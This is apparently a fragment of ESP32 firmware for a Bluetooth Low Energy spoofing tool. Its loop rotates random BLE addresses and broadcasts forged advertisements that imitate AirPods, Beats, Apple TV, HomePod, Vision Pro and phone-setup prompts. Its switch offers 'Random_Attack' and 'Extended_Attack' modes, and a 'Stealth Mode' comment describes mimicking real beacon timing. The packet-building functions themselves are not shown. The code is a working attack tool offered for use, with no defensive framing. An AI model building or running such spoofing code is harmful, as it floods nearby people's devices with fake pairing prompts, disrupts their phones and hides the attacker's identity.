void loop() {
  
  server.handleClient();

  if (attack_state == 1) {
    strip.setPixelColor(0, strip.Color(0, 255, 0));
    strip.show();

    uint8_t dummy_addr[6] = {0};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
    }
    dummy_addr[5] |= 0xC0; 
    
    selectDevice(selectedPacket);
    
    pAdvertising->stop();
    ble_hs_id_set_rnd(dummy_addr);
    
    NimBLEAdvertisementData oAdvertisementData = getAdvertismentData();
    pAdvertising->setAdvertisementData(oAdvertisementData);

    // Stealth Mode Configuration: 0x140 mimics real device beacon timing
    pAdvertising->setMinInterval(0x140);
    pAdvertising->setMaxInterval(0x140);
    
    pAdvertising->start();
    
    unsigned long start_time = millis();
    while (millis() - start_time < delayMilliseconds) {
      server.handleClient(); 
      if (attack_state == 0) {
        strip.clear();
        strip.show();
        break;
      }
      delay(10);
    }
  } else {
    strip.clear();
    strip.show();
  }
}

void selectDevice(int selectedPacket) {
  switch (selectedPacket) {
    case 0: Airpods(); break; case 1: Airpods_pro(); break; case 2: Airpods_Max(); break;
    case 3: Airpods_Gen_2(); break; case 4: Airpods_Gen_3(); break; case 5: Airpods_Pro_Gen_2(); break;
    case 6: Power_Beats(); break; case 7: Power_Beats_Pro(); break; case 8: Beats_Solo_Pro(); break;
    case 9: Beats_Studio_Buds(); break; case 10: Beats_Flex(); break; case 11: Beats_X(); break;
    case 12: Beats_Solo_3(); break; case 13: Beats_Studio_3(); break; case 14: Beats_Studio_Pro(); break;
    case 15: Betas_Fit_Pro(); break; case 16: Beats_Studio_Buds_Plus(); break; case 17: AppleTV_Setup(); break;
    case 18: AppleTV_Pair(); break; case 19: AppleTV_New_User(); break; case 20: AppleTV_AppleID_Setup(); break;
    case 21: AppleTV_Wireless_Audio_Sync(); break; case 22: AppleTV_Homekit_Setup(); break;
    case 23: AppleTV_Keyboard_Setup(); break; case 24: AppleTV_Connecting_to_Network(); break;
    case 25: Homepod_Setup(); break; case 26: Setup_New_Phone(); break; case 27: Transfer_Number(); break;
    case 28: TV_Color_Balance(); break; case 29: Apple_Vision_Pro(); break; case 30: Random_Attack(); break;
    case 31: Extended_Attack(); break; case 32: Flipper_Zero(); break; default: Random_Attack(); break;
  }
}

